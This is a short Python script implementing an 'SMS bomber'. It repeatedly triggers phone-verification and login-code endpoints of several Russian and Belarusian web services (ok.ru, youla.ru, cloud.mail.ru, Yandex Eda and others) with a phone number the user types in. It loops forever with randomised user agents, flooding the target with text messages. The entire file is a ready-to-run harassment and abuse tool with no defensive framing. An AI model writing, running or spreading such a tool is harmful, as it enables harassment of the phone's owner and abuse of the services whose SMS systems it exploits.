import requests
from requests.api import head 
from fake_useragent import UserAgent
import time 

class SMSBomber:
    def __init__(self, number):
        self.number = number
        self.servise = {
            'https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone': {'data': {'phone': number}},
            "https://youla.ru/web-api/auth/request_code": {'data': {'phone': number}},
            "https://cloud.mail.ru/api/v2/notify/applink": {'data': {'phone': number, 'api': 2, 'email':'email', 'x-email': 'x-email'}},
            "https://delivio.by/be/api/register": {'json': {'phone': number}},
            "https://eda.yandex/api/v1/user/request_authentication_code": {'json' : {'phone_number' : number}},
            "https://www.slivki.by/login/send-code": {'get': number}
            
        }
        self.delay = 10

    def attack(self):
        user_agent = UserAgent().random
        headers = {'user_agent': user_agent}
        iteration = 0

        while True:
            for key, value in self.servise.items():
                for _type, meta in value.items():
                    try:
                        if _type == 'data':
                            request = requests.post(key, headers=headers, data=meta)
                        elif _type == 'json':
                            request = requests.get(key, headers=headers, json=meta)
                        elif _type == 'get':
                            request = requests.get(key+self.number, headers=headers)
                        print(f'[send:] {key.split("/")[2].title()} completed!')
                    except:
                        print(f'[send:] {key.split("/")[0].title()} failed!')
            iteration +=1 
            print(f'{iteration}, round complete')
            time.sleep(self.delay)
if __name__ == '__main__':
    number = input('Send number: ')
    sms = SMSBomber(number)
    sms.attack()
